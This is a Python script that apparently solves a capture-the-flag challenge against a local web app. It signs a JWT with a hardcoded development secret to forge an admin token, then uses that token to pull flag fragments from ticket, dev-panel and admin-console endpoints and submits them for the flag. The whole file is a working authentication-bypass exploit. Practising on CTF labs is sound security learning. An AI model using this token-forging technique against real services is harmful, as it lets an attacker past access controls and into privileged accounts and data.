import base64, json, hmac, hashlib, time, urllib.request

SECRET = "dev-jwt-secret-do-not-use-in-production"
BASE = "http://127.0.0.1:8080"

# Forge admin token
def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

payload = {
    "sub": "u-staff-5e6f7a8b",
    "email": "staff@companion.local",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
pay = b64(json.dumps(payload).encode())
sig = b64(hmac.new(SECRET.encode(), (header + "." + pay).encode(), hashlib.sha256).digest())
TOKEN = f"{header}.{pay}.{sig}"
print(f"[+] Token forged")

def api_get(path):
    req = urllib.request.Request(BASE + path, headers={"Authorization": f"Bearer {TOKEN}"})
    return json.loads(urllib.request.urlopen(req).read())

def api_post(path, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST",
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

# Get fragments
r1 = api_get("/api/v1/tickets/2003")
frag1 = r1["meta"]["fragment_1"]
print(f"[+] Fragment 1: {frag1}")

r2 = api_get("/api/v1/dev/panel")
frag2 = r2["fragment_2"]
print(f"[+] Fragment 2: {frag2}")

r3 = api_get("/api/v1/admin/console")
frag3 = r3["fragment_3"]
print(f"[+] Fragment 3: {frag3}")

# Finalize
flag = api_post("/api/v1/finalize", {"fragment_1": frag1, "fragment_2": frag2, "fragment_3": frag3})
print(f"\n[!!!] FLAG: {flag['flag']}")
